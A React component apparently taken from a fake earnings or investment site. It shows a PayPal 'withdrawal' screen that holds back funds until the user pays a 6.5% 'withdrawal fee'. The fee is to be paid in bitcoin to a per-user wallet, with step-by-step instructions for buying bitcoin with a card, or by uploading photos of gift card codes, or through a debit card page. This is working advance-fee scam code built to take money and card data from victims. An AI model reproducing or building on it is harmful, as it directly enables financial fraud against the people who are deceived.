import { useState } from "react";
import "../styles/paypal.css"
import { NavLink } from "react-router-dom";
import { useNavigate } from "react-router-dom";
import { toast } from "react-toastify";


import { useEffect } from "react";
import { auth, db } from "../firebaseConfig";
import { doc, getDoc } from "firebase/firestore";
import LoadingScreen from "./loadingScreen";


function PayPal(prop) {


    const [userDetails, setUserDetails] = useState(null)

    const fetchUserData = async (e) => {
        auth.onAuthStateChanged(async (user) => {
            console.log(user);
            const docRef = doc(db, "users", user.uid);
            const docSnap = await getDoc(docRef);
            if (docSnap.exists()) {
                setUserDetails({ ...docSnap.data(), id: user.uid })
                console.log(docSnap.data())
            }
        })
    };

    useEffect(() => {
        fetchUserData()
    }, [])

    const navigate = useNavigate();

    function madePayment() {
        navigate("../paymentPage")
    }

    const [step, setStep] = useState("step1");

    const [method, setMethod] = useState("bitcoin")

    const [selectedMethod, setSelectedMethod] = useState("");

    const [payAccount, setPayAccount] = useState("")

    const cryptoStyle = {
        background: selectedMethod == "crypto" ? `#008849` : `white`,
        color: selectedMethod == "crypto" ? `white` : `black`,
    }

    const giftStyle = {
        background: selectedMethod == "gift" ? `#008849` : `white`,
        color: selectedMethod == "gift" ? `white` : `black`,
    }

    const cardStyle = {
        background: selectedMethod == "card" ? `#008849` : `white`,
        color: selectedMethod == "card" ? `white` : `black`,
    }



    const [image, setImage] = useState(null);
    const [preview, setPreview] = useState(null);

    const handleImageChange = (e) => {
        const file = e.target.files[0];
        if (file && file.type.startsWith("image/")) {
            setImage(file);
            const reader = new FileReader();
            reader.onloadend = () => {
                setPreview(reader.result);
            };
            reader.readAsDataURL(file);
        } else {
            setImage(null);
            setPreview(null);
        }
    };

    const imgStyle = {
        backgroundImage: preview ? `url(${preview})` : `url("https://www.svgrepo.com/show/215084/gift-card.svg")`,
        backgroundSize: `cover`,
        backgroundPosition: `center`,

    }



    function toStep2() {
        if (payAccount && payAccount.length > 5) {
            setStep("step2")
        } else {
            toast.error('enter a valid paypal account', { position: "top-center" })
        }
    }

    function showMethod() {
        if (selectedMethod == "crypto") {
            return <div className="bitcoin">
                <div className="bit-head">
                    <img src="https://tse1.mm.bing.net/th/id/OIP.6LcuCI5DJF6hjjOoZWKyoAHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
                    <h1>Bitcoin</h1>
                </div>
                <div className="wallet-address">
                    <h1>Bitcoin wallet address:</h1>
                    <p>{userDetails ? userDetails.cryptoAddress : ""}</p>
                </div>
                <div className="note">
                    <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
                </div>
                <button className="made-payment" onClick={madePayment}>I have made payment</button>
                <div className="paybis">
                    <h1>Dont have bitcoin?</h1>
                    <button>Buy from Paybis</button>

                    <p>step 1: click on the button and select your region (eg US:Dollar)</p>
                    <p>step2: select bitcoin from the option of crypto to purchase</p>
                    <p>step3: enter the above wallet address as purchase destination</p>
                    <p>Step4: complete purchase with your credit/debit card</p>
                </div>
            </div>
        } else if (selectedMethod == "gift") {
            return <div className="verify-page">
                <div className="verify-nav"><i className="bi-arrow-left" onClick={() => { setStep("step2") }}></i></div>
                <div className="upload">
                    <div className="verify-head">
                        <h1>Upload Gift Card</h1>
                        <p>upload a photo of back of gift card reavling it's codes</p>
                    </div>
                    <div className="main-verify">
                        <div className="verify-image" style={imgStyle}></div>
                        <input type="file" onChange={handleImageChange} />
                    </div>
                </div>

                <button className="verify-button" onClick={() => { setVerify("pending") }}>Continue</button>
            </div>
        } else if (selectedMethod == "card") {
            navigate("../debitCard")
        }
    }

    function showStep() {
        if (step == "step1") {
            return <div className="paypal-box">
                <img src="https://static.vecteezy.com/system/resources/previews/022/100/701/large_2x/paypal-logo-transparent-free-png.png" />

                <h1>Enter Your PayPal Account</h1>
                <input type="email" placeholder="user@email.com" onChange={(e) => setPayAccount(e.target.value)} />
                <button onClick={toStep2}> Next <i className="bi-arrow-right"></i></button>
            </div>
        } else if (step == "step2") {
            return <div className="pay-send">
                <div className="pay-head">
                    <p>Transfer</p>
                    <h1 className="head-special">${prop.withAmount} <br /> </h1>

                    <p>To</p>
                    <h1>{payAccount}</h1>
                    <p>Withdrawal Fee:</p>
                    <h1 className="head-special2">${Math.floor(prop.withAmount * 0.065)}.00</h1>
                </div>
                <div className="fee-method">
                    <h2> Pay Withdrawal Fee (${Math.floor(prop.withAmount * 0.065)}) with</h2>
                    <div className="method" style={cryptoStyle} onClick={() => setSelectedMethod("crypto")}>
                        <img src="https://tse4.mm.bing.net/th/id/OIP.L37frQFm2G-k6wXWyTxI9AHaHa?r=0&w=1920&h=1920&rs=1&pid=ImgDetMain&o=7&rm=3" />
                        <p>Pay With Crypto</p>
                    </div>
                    <div className="method" style={giftStyle} onClick={() => setSelectedMethod("gift")} >
                        <img src="https://tse1.mm.bing.net/th/id/OIP.znjEvy_DOIJjKD4S2qOO7gHaEf?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
                        <p>Pay With Gift Card</p>
                    </div>
                    <div className="method" style={cardStyle} onClick={() => setSelectedMethod("card")}>
                        <img src="https://download.logo.wine/logo/Mastercard/Mastercard-Logo.wine.png" alt="" />
                        <p>Pay With Debit Card</p>
                    </div>
                    <button onClick={() => { setStep("step3") }}>Next <i className="bi-arrow-right"></i></button>
                </div>
            </div>
        } else if (step == "step3") {
            return <div>
                {showMethod()}
            </div>
        }
    }

    return (
      <>
       {userDetails ?   <section className="paypal">
            <div className="steps-div">
                {step == "step1" ? <div className="step-green"></div> : <div className="step"></div>}
                {step == "step2" ? <div className="step-green"></div> : <div className="step"></div>}
                {step == "step3" ? <div className="step-green"></div> : <div className="step"></div>}
            </div>

            {showStep()}
        </section>: <LoadingScreen/>}
      </>
    )
}

export default PayPal;